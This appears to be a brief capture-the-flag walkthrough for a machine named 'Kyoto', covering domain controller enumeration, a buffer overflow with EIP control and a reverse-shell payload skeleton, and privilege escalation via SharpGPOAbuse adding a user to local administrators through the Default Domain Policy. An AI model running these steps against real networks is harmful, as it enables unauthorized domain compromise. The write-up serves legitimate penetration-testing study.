# Kyoto
> DC enum + buffer overflow + SharpGPOAbuse

## Enumeration

```
nmap -sC -sV -oN nmap.txt <IP>
```

```
enum4linux -a <IP>
```

Custom service with buffer overflow identified.

## Exploitation

Binary analysis → offset identification and EIP control.

```
msf-pattern_create -l 500
msf-pattern_offset -q <EIP value>
```

Exploit developed with reverse shell shellcode:

```python
buf = b"A" * offset + struct.pack("<I", ret_addr) + shellcode
```

Initial access obtained as low-privilege user.

## Privilege Escalation

User with GPO edit permission identified:

```
.\SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "net localgroup administrators <user> /add" --GPOName "Default Domain Policy"
```

```
gpupdate /force
```

Local administrator obtained → SYSTEM.
